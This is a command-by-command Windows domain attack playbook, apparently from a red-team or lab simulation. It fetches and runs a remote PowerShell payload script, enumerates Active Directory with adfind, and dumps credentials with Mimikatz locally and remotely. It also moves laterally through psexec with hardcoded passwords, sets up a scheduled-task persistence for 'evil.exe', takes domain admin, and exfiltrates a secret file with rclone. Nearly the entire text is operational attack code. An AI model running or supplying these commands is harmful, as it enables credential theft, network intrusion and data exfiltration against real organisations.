"Initial  access"
cmdinspector
whoami
hostname
cd c:\
mkdir exploit
cd c:\exploit\

"Run initial script to download useful executables for the attack"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/payloads.ps1" -OutFile "payloads.ps1"
./payloads.ps1
dir

"Collect information about the victim"
c:/exploit/adfind/adfind.exe -f "objectcategory=computer" | select-string -pattern 'dn:CN=.*' > c:/exploit/computers.txt
get-content computers.txt 
c:/exploit/adfind/adfind.exe  -sc admincountdmp | select-string -pattern '>name:.*' > c:/exploit/admins.txt
get-content admins.txt
net group /domain > c:/exploit/group_domains.txt
get-content group_domains.txt
whoami /groups > c:/exploit/user_group.txt
get-content user_group.txt


"Run Mimikatz on local PC"
c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern "\*\s+(Username|Domain|NTLM)\s+: .*" > c:\exploit\mimiout.txt
get-content mimiout.txt

"Remotely  run"

"Create Share"
$password = 'Cato2023!'
$user = "sec.content\danny"
$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\PC-Danny cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\PC-Danny cmd.exe /c net share exploit=c:\exploit /grant:Everyone,FULL " -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"

"Creating Persistence"
net use z: \\PC-Danny\exploit
xcopy c:\exploit\evil.exe z:\ /E /y
dir z:\
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 30 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s PC-Danny" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"

"Copy Mimikatz"
xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y
dir z:\mimikatz
"Run Mimikatz On Remote PC"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\PC-Danny powershell -command `"c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debig sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+:.*' > c:\exploit\mimiout.txt`"" -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"
dir c:\exploit
get-content mimiout.txt

"Gaining Domain Admin!!!"
$password = 'Cadmin!'
$user = "sec.content\Administrator"
$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
$admincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c whoami /groups > c:\exploit\admin_group.txt" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
get-content c:\exploit\admin_group.txt

"WMI Execution To DC"
Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c wmic /node:dcontent process get name > c:\exploit\dc_process_name.txt" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
get-content dc_process_name.txt 

"PsExec To the DC"
Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\dcontent cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden  -WorkingDirectory "c:\exploit\pstools\"
Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\dcontent cmd.exe /c net share exploit=c:\exploit "  -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"
Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\dcontent Move-Item –Path c:\secret_data\secret_data.txt -Destination c:\exploit\ "  -WindowStyle Hidden -WorkingDirectory "c:\exploit\pstools\"

"Exfil"
net use w: \\dcontent\exploit
xcopy  w:\secret_data.txt c:\exploit\ /E /y
dir
c:\exploit\rclone.exe copy c:\exploit\secret_data.txt remote:exfil

